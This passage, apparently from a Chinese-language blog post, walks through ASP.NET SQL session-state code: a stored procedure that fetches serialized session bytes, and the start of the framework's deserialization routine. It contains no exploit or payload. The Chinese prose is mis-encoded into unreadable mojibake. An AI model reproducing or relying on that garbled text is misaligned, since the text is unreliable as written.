                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGetExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_partitionInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AppSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @id&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @itemShort&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @locked&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockDate or @lockAge&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockCookie&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @actionFlags&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlExecuteReaderWithRetry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;nf&quot;&gt;ThrowSqlConnectionException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;cm&quot;&gt;/* Get short item */&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MemoryStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_configCompressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;_rqOrigStreamLen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;DisposeOrReuseConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlStateConnection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDisposable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dbo.TempGetStateItem3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_sqlConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StoredProcedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandTimeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_commandTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;// ignore process of setting parameters&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥å¾ç¨‹å¼ç¢¼æ¸…æ¥šçœ‹å‡ºä¸»è¦æ˜¯å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASPState.dbo.TempGetStateItem3&lt;/code&gt; Stored Procedure å–å¾— Session çš„åºåˆ—åŒ–äºŒé€²åˆ¶è³‡æ–™ä¸¦ä¿å­˜åˆ° buf è®Šæ•¸ï¼Œæœ€å¾Œå°‡ buf å‚³å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateUtility.DeserializeStoreData&lt;/code&gt; é€²è¡Œååºåˆ—åŒ–é‚„åŸå‡º Session ç‰©ä»¶ï¼Œè€Œ TempGetStateItem3 é€™å€‹ SP å‰‡æ˜¯ç›¸ç•¶æ–¼åœ¨åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions&lt;/code&gt;ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“ Session æ˜¯å„²å­˜åœ¨ ASPStateTempSessions è³‡æ–™è¡¨çš„ SessionItemShort æ¬„ä½ä¸­ã€‚æ¥è‘—è®“æˆ‘å€‘ç¹¼çºŒå¾€ä¸‹çœ‹é—œéµçš„ DeserializeStoreData åšäº†ä»€éº¼æ¨£çš„æ“ä½œã€‚åŒæ¨£åœ°ï¼Œè¡Œæ•¸åå¤šï¼Œæœ‰éœ€æ±‚çš„æœ‹å‹è«‹è‡ªè¡Œä¸‹æ‹‰ XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionStateUtility&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SecurityPermission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerializationFormatter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BinaryReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSessionStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
